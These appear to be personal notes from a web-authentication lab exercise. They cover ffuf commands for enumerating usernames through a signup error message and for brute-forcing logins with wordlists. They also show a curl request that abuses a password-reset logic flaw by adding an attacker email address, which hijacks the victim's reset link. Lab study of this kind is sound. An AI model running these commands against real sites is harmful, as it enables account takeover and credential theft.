
### FFUF :-

If we try entering the username **admin** and fill in the other form fields with fake information, you'll see we get the error **An account with this username already exists**. We can use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool below. The ffuf tool uses a list of commonly used usernames to check against for any matches.


# In the sign up page 

```

ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.48.142.162/customers/signup -mr "username already exists"

```

This ffuf command is used to **check which usernames already exist** on a signup page.

- **`-w`**: Points to a wordlist containing usernames to test
- **`FUZZ`**: Placeholder where each username from the wordlist is inserted
- **`-X POST`**: Sends a POST request (instead of the default GET)
- **`-d`**: Sends form data (username, email, password, cpassword)
- **`-H`**: Adds headers, here specifying form data content type
- **`-u`**: Target URL for the request
- **`-mr`**: Looks for the response text _"username already exists"_ to confirm a valid username

https://github.com/ffuf/ffuf   :   worlist and tool link


# In the sign in page

Now using the username we are trying to login using brute force technique

```

ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.48.142.162/customers/login -fc 200

```

This ffuf command is used to **brute-force login credentials** using valid usernames and common passwords.

- **`-w`**: Loads two wordlists (usernames as `W1`, passwords as `W2`)
- **`W1` / `W2`**: Placeholders replaced with usernames and passwords
- **`-X POST`**: Sends a POST login request
- **`-d`**: Submits login form data (username and password)
- **`-H`**: Sets the request as form data
- **`-u`**: Target login URL
- **`-fc 200`**: Filters out HTTP 200 responses, showing only non-200 results that may indicate successful logins

---
## **Logic Flaw**


**What is a Logic Flaw?**

Sometimes authentication processes contain logic flaws. A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. Logic flaws can exist in any area of a website, but we're going to concentrate on examples relating to authentication in this instance.

![[Pasted image 20260108221150.png]]



## **Logic Flaw Practical**

![[Pasted image 20260109000543.png]]

![[Pasted image 20260109000824.png]]

![[Pasted image 20260109000839.png]]

![[Pasted image 20260109000848.png]]


**This is a password reset page where if we give a email it checks that was genuine or not then ask for username then it sends a URL to update the password.**

```
Credentials :-

robert@acmeitsupport.thm
robert
```

#### **Lets see how to bypass this :-**

```
curl 'http://10.49.152.227/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
```

**Normal terminal way to send a password update request.**

```
curl 'http://10.49.152.227/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```

Here first we create a own account on that site and then simply change the robert's email with ours mail and the website does not validate it and send the link to my account from the URL I change the password and hacked the account.

